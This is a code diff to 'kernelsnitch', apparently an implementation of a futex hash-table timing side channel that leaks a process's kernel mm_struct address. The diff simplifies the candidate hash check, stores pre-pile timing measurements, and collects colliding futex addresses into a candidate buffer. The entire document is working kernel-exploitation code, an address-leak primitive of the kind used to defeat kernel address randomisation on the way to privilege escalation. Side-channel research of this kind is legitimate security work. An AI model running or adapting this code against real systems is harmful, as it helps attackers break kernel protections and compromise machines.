@@ -88,7 +88,11 @@ struct kernelsnitch_shared_state {
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
 
     volatile size_t *futex_addrs;
+    volatile size_t *candidate_addrs;
+    volatile size_t candidate_count;
+    volatile size_t candidate_max;
     volatile size_t *times;
+    volatile size_t *t_before;
     volatile size_t found;
     volatile size_t mm_struct;
     volatile size_t dbg_any_match; /* diagnostic: candidates where >=2 addrs share a bucket */
@@ -238,26 +242,19 @@ static void *__mm_leak(void *arg)
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
                     // test the mm_struct candidate
-                    size_t others = ks->collisions - 1;
-                    /* multi-variant probe: 0=standard 1=swapped 2=no+16seed 3=ret-a */
-                    size_t need = others;
-                    size_t hitv = (size_t)-1;
-                    for (size_t v = 0; v < 4 && hitv == (size_t)-1; ++v) {
-                        size_t agree = 0;
-                        for (size_t i = 1; i < ks->collisions; ++i)
-                            if (futex_hash_v(ks->futex_addrs[0], mm_struct_candidate, v) == futex_hash_v(ks->futex_addrs[i], mm_struct_candidate, v))
-                                agree++;
-                        if (agree >= 1)
-                            ks->dbg_any_match++;
-                        if (agree >= need)
-                            hitv = v;
-                    }
-                    found_hash = (hitv != (size_t)-1);
+                    size_t need = ks->collisions - 1;
+                    size_t agree = 0;
+                    for (size_t i = 1; i < ks->collisions; ++i)
+                        if (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate))
+                            agree++;
+                    if (agree >= 1)
+                        ks->dbg_any_match++;
+                    found_hash = (agree >= need);
                     if (found_hash) {
                         ks->mm_struct = mm_struct_candidate;
                         if (ks->verbose)
-                            pr_info("CANDIDATE variant=%zu mm=%016zx need=%zu\n",
-                                    hitv, mm_struct_candidate, need);
+                        pr_info("CANDIDATE mm=%016zx need=%zu\n",
+                                mm_struct_candidate, need);
                         ks->found = 1;
                         break;
                     }
@@ -320,6 +317,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
     ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
     ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
@@ -327,6 +325,9 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->candidate_max = 4096;
+    ks->candidate_count = 0;
+    ks->candidate_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
     if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
         ks->cpu_cnt,
@@ -381,6 +382,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (id >= FUTEX_SZ)
             break;
         t_before[i] = __measure((size_t)&ks->futexes[id]);
+        ks->t_before[i] = t_before[i];
     }
 
     /* pile the bucket */
@@ -391,7 +393,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
                              approx_time, threshold);
     /* phase 2: post-pile; require both slow AND grown vs pre-pile */
-    for (size_t i = 2; i < total && count < wanted; ++i) {
+    for (size_t i = 2; i < total; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
@@ -399,8 +401,13 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->times[i] = __measure(futex_addr);
         if (ks->times[i] > threshold &&
             ks->times[i] > t_before[i] * 3) {
-            count++;
-            ks->futex_addrs[count] = futex_addr;
+            if (count < wanted) {
+                count++;
+                ks->futex_addrs[count] = futex_addr;
+            }
+            if (ks->candidate_count < ks->candidate_max) {
+                ks->candidate_addrs[ks->candidate_count++] = futex_addr;
+            }
             if (ks->verbose) pr_info("  %016zx (before=%zu after=%zu)\n",
                                      futex_addr, t_before[i],
                                      (size_t)ks->times[i]);
@@ -469,10 +476,14 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
     ks->times = 0;
+    munmap((void *)ks->t_before, sizeof(size_t)*ks->total_futexes);
+    ks->t_before = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
     ks->tids = 0;
     munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
     ks->futex_addrs = 0;
+    munmap((void *)ks->candidate_addrs, sizeof(size_t)*ks->candidate_max);
+    ks->candidate_addrs = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
     size_t ret = ks->mm_struct;
